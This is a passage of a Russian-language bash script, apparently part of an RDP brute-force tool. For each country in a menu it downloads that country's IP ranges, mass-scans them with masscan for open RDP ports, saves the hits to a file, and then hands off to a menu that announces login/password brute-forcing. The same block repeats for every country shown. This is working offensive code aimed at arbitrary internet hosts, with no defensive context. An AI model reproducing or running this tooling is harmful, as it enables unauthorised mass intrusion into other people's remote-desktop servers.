masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU
else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "9" ]; then
curl http://ipdiapazon.16mb.com/Argentina.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU

else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "10" ]; then
curl http://ipdiapazon.16mb.com/Armenia.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU

else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "11" ]; then
curl http://ipdiapazon.16mb.com/Aruba.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU

else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "12" ]; then
curl http://ipdiapazon.16mb.com/Australia.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "13" ]; then
curl http://ipdiapazon.16mb.com/Austria.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "14" ]; then
curl http://ipdiapazon.16mb.com/Azerbaijan.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "15" ]; then
curl http://ipdiapazon.16mb.com/Bahamas.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "16" ]; then
curl http://ipdiapazon.16mb.com/Bahrain.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "17" ]; then
curl http://ipdiapazon.16mb.com/Bangladesh.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "18" ]; then
curl http://ipdiapazon.16mb.com/Barbados.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "19" ]; then
curl http://ipdiapazon.16mb.com/Belarus.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "20" ]; then
curl http://ipdiapazon.16mb.com/Belgium.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "21" ]; then
curl http://ipdiapazon.16mb.com/Belize.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU

else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "22" ]; then
curl http://ipdiapazon.16mb.com/Benin.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU

else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "23" ]; then
curl http://ipdiapazon.16mb.com/Bermuda.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU

else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "24" ]; then
curl http://ipdiapazon.16mb.com/Bhutan.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "25" ]; then
curl http://ipdiapazon.16mb.com/Bolivia.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU

else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "26" ]; then
curl http://ipdiapazon.16mb.com/Bosnia_and_herzegowina.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
